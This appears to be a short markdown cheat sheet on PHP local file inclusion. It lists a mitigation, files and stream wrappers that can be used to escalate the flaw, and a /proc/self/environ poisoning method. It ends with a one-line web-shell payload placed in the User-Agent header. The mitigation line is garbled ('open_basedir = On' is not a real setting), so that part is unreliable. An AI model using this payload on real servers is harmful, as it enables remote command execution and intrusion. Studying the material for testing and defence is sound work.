# LFI

LFI mitigiation:
~~~
open_basedir = On in php.ini

(if this is on, PHP can't access any file outside the specified directory) , essentially kills the purpose of include statements in other directories such as libraries)
~~~

Techniques which can be used to leverage LFI:
~~~
- /proc/self/environ
- /proc/self/fd
- /var/log/apache2/access.log
- /var/log/auth.log
- php://input wrapper
- php://filter wrapper
- data:wrapper
~~~


## /proc/self/environ

Contains environment variables
   - REMOTE_PORT
   - HTTP_USER_AGENT
   - etc

`SHOULD NOT BE ACCESSIBLE FROM NON-ROOT USERS`

Exploit:

Intercept request and edit the User-Agent, and replace with php executable code.

Example:
User-Agent: <?php system($_GET['cmd']); ?>

